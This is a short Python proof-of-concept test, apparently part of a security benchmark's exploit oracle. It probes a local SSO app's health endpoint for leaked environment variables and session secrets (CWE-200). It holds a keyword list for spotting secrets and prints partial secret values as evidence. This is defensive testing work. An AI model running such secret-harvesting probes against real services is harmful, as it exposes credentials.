"""PoC: Health endpoint leaks environment variables (CWE-200)."""
from mosaic.oracle.exploit import ExploitTest

class HealthInfoLeakExploit(ExploitTest):
    def __init__(self, base_url="http://localhost:3010"):
        super().__init__(base_url)
    @property
    def chain_id(self): return "sso_health_info_leak"
    def setup(self): pass
    def execute(self):
        evidence = []
        resp = self.http_get("/simplesso/health")
        if not resp.ok:
            return False, f"Health endpoint returned {resp.status_code}"
        try:
            data = resp.json()
            evidence.append(f"Health response keys: {list(data.keys())}")

            # Check for env vars
            env = data.get("env", {})
            if env:
                evidence.append(f"Env vars exposed: {list(env.keys())[:10]}")
                # Check for secrets
                for key in env:
                    k_lower = key.lower()
                    if any(s in k_lower for s in ["secret", "password", "key", "token", "jwt"]):
                        val = str(env[key])
                        if len(val) > 3:
                            evidence.append(f"Secret env var leaked: {key}={val[:20]}...")
                            return True, "CWE-200 Environment secrets leaked via health endpoint. " + " | ".join(evidence)
                # Even without explicit secrets, env vars are a leak
                if len(env) > 0:
                    return True, "CWE-200 Environment variables exposed via health endpoint. " + " | ".join(evidence)

            # Check for session config with secret
            session = data.get("sessionConfig", {})
            if session:
                secret = session.get("secret", "")
                if secret and secret != "unknown" and len(str(secret)) > 3:
                    evidence.append(f"Session secret leaked: {str(secret)[:20]}...")
                    return True, "CWE-200 Session secret leaked via health endpoint. " + " | ".join(evidence)

            # Check raw response for any secret-like values
            raw = resp.text.lower()
            if "secret" in raw or "password" in raw or "mongodb" in raw:
                evidence.append("Secret-like values found in health response")
                return True, "CWE-200 Sensitive data in health response. " + " | ".join(evidence)

        except Exception as e:
            evidence.append(f"Parse: {e}")
        return False, "No sensitive data in health endpoint. " + " | ".join(evidence)
